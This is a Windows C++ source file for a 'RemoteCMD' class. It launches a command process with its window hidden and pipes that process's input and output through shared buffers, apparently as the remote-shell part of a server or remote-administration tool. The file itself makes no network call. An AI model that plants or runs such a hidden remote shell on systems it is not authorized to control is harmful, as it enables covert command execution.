#include "stdafx.h"
#include"server_remote_cmd.h"

using namespace std;


RemoteCMD::RemoteCMD(BYTE *inputbuffer, BYTE *outputbuffer, HANDLE sendEvent)
{
	this->sendEvent = sendEvent;
	this->readBuffer = inputbuffer;
	this->writeBuffer = outputbuffer;
}

//RemoteCMD::RemoteCMD(int mID)
//{
//	this->sendEvent = gExchangeBuffer[mID].sendEvent;
//}

RemoteCMD::~RemoteCMD() 
{
	CloseHandle(push.input);
	CloseHandle(push.output);
	CloseHandle(get.input);
	CloseHandle(get.output);
}


void RemoteCMD::remoteContrl() throw(DWORD)
{
	sa.nLength = sizeof(sa);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	if (!CreatePipe(
		&(get.output),
		&(get.input),
		&sa,
		1024
	))
	{
		cout << "Create Get Pipe Failed!\n";
		throw GetLastError();
	}
	if (!CreatePipe(
		&(push.output),
		&(push.input),
		&sa,
		1024
	))
	{
		cout << "Create Push Pipe Failed!\n";
		throw GetLastError();
	}

	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = get.output;
	si.hStdOutput = si.hStdError = push.input;

	if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
	{
		throw GetLastError();
	}

	CMDMUTEX = true;

	while (CMDMUTEX)
	{
		DWORD written;
		DWORD readed;
		DWORD commandLength;
		DWORD dReader;

		WriteFile(get.input, readBuffer, 1024, &written, NULL);

		Sleep(2000);

		while (PeekNamedPipe(push.output, writeBuffer, 1024, &dReader, NULL, 0))
		{
			ResetEvent(sendEvent);
			memset(writeBuffer, 0, 1024);
			ReadFile(push.output, writeBuffer, dReader, &dReader, NULL);


			WaitForSingleObject(sendEvent, INFINITE);
		}
	}
	return;
}